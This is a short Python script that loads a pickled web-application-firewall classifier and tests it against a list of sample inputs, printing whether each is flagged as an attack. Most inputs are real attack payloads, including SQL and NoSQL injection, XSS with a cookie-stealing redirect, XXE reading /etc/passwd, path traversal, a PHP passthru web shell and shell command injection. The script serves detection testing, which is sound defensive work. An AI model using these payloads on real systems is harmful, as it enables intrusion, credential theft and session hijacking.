import pickle
loaded_model = pickle.load(open('waf_model.sav', 'rb'))

#List of payloads to test waf model
parameters = [
  "%3f%0dshivang:crlf=injection", "query=home&homeprice=4300","#shivang{{5*7}}","<pre><!--#exec cmd=\"id\"--></pre>","../\\\\\\../\\\\\\../\\\\\\etc/passwd%00%00", 
  
  "query=shivang)))' OR 1=2#-- -", 

              "something;|id|", "{$gt: ''}",
              
              "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">",
              
              "<script>window.location='dummy/catch.php?cookie='+document.cookie</script>",
              
              "%3Cscript%3E%0Awindow.location%3D%27dummy%2Fcatch.php%3Fcookie%3D%27%2Bdocument.cookie%0A%3C%2Fscript%3E",
              
              "%2c(select%20*%20from%20(select(sleep(10)))a)",
              
              "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='"
              
              '''<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><test>&xxe;</test>''',
              
              "'Union select * from (select 200 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as email,'123' as 'password' ,'admin' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '2024-10-02 17:54:05.110 +00:00' as 'createdAt', '2024-10-02 18:53:00.980 +00:00' as 'updatedAt', null as 'deletedAt') --",
              
              "<?php echo passthru($_GET['cmd']); ?>",
              
              
              "xsacdsac;ping -c 11 127.0.0.1",

              """<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)">""",
                  
              """" OR%1=1 """,

            "SELECT * FROM users WHERE username = 'admin' AND SLEEP(10)",


            "ID",

              ]
temp_array = []
#Function acts as backend for payload detection

def waf_check(parameters, temp_array):
  for detect in range(len(parameters)):
    temp_array.append(parameters[detect])
    prediction = loaded_model.predict(temp_array)
    if "valid" in prediction:
      print("\n[+] You can access our site!\n")
    else:
      print("[!] Attack detected!...Hold your horses!")
      for result in prediction:
        print(f"[~] Attack type", result)
    temp_array = []
    
#Call the api
waf_check(parameters, temp_array)